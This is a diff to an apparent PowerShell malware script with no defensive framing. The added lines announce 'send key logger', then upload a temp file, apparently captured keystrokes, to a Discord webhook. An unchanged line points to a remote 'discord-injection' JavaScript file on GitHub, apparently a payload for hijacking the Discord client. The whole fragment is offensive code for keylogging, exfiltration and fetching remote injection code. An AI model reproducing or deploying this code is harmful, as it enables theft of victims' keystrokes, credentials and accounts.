@@ -1,4 +1,5 @@
-# URL của tệp cần tải
+
+
 
 function loghook {
     param (
@@ -27,7 +28,19 @@ function loghook {
 }
 
 # Example usage
+loghook "viticm start computer!`nsend key logger ..."
+$webhookUrl = "YOUR_WEBHOOK_HERE2"
 
+# Define the file path
+$filePath = "$env:temp\Log.tmp"
+
+# Create a form for the file upload
+$form = @{
+    file = Get-Item -Path $filePath
+}
+
+# Send the file to the Discord webhook
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form
 
 
 $url = "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/injection.js"
